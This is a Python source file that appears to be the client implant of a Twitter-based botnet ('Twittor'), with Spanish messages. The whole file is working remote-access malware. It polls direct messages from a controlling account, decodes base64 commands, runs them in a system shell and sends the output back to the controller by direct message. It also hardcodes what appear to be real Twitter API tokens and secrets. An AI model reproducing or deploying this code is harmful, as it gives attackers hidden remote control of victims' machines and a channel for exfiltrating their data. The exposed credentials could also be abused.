from tweepy import Stream
from tweepy import OAuthHandler
from tweepy import API
from tweepy.streaming import StreamListener
from uuid import getnode as get_mac
import ctypes
import json
import threading
import subprocess
import base64
import platform


api = None

CONSUMER_TOKEN = 'RDLCb666OV6vpCd2Io0efsrMQ'
CONSUMER_SECRET = 'xp4bFkSrOUbPmDHvyBxXeHRw3w1DGxPjzgnN7FnbqS482gs5TQ'

ACCESS_TOKEN = '936178099078750208-jXFXv9IAKPY77BlN14K9LeX5x1FjW6L'
ACCESS_TOKEN_SECRET = 'YFg0VwPPvBOS5FAFNIY8RA34Cxe9XODljTYeQwddtOmrH'

USERNAME = 'PruebaPruebaPr6'
MAC_ADDRESS = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))


class TwittorException(Exception):
    """
        Base exception
    """

    def __init__(self, message, errors):
        Exception.__init__(self, message)
        self.errors = errors

class DecodingException(TwittorException):
    """
        Exception when trying to decode a CommandOutput
    """



class CommandToExecute:

    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except:
            raise DecodingException('Error decodificando el mensaje: %s' % message)

    def is_for_me(self):
        global MAC_ADDRESS
        return MAC_ADDRESS == self.receiver or self.cmd == 'PING' and 'output' not in self.data

    def retrieve_command(self):
        return self.jobid, self.cmd


class CommandOutput:

    def __init__(self, sender, receiver, output, jobid, cmd):
        self.sender = sender
        self.receiver = receiver
        self.output = output
        self.cmd = cmd
        self.jobid = jobid

    def build(self):
        cmd = {'sender': self.sender,
                'receiver': self.receiver,
                'output': self.output,
                'cmd': self.cmd,
                'jobid': self.jobid}
        return base64.b64encode(json.dumps(cmd))


class ExecuteCommand(threading.Thread):

    def __init__(self, jobid, cmd):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.command = cmd

        self.daemon = True
        self.start()

    def run(self):
        if (self.command == 'PING'):
            output = platform.platform()
        else:
            output = subprocess.check_output(self.command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
        output_command = CommandOutput(MAC_ADDRESS, 'master', output, self.jobid, self.command)
        api.send_direct_message(user=USERNAME, text=output_command.build())


class StdOutListener(StreamListener):

    def on_data(self, status):
        try:
            data = json.loads(status)
            if data['direct_message'] and data['direct_message']['sender_screen_name'] == USERNAME:
                try:
                    cmd = CommandToExecute(data['direct_message']['text'])
                    if (cmd.is_for_me()):
                        jobid, cmd = cmd.retrieve_command()
                        print 'jobid: %s, comando a ejecutar: %s' % (jobid, cmd)
                        ExecuteCommand(jobid, cmd)
                except:
                    pass
        except:
            print 'No se ha podido decodificar %s' % status
        return True


def main():
    global api

    try:
        auth = OAuthHandler(CONSUMER_TOKEN, CONSUMER_SECRET)
        auth.secure = True
        auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)

        api = API(auth)
        stream = Stream(auth, StdOutListener())
        stream.userstream()

    except BaseException as e:
        print("Error en main()", e)

if __name__ == '__main__':
    main()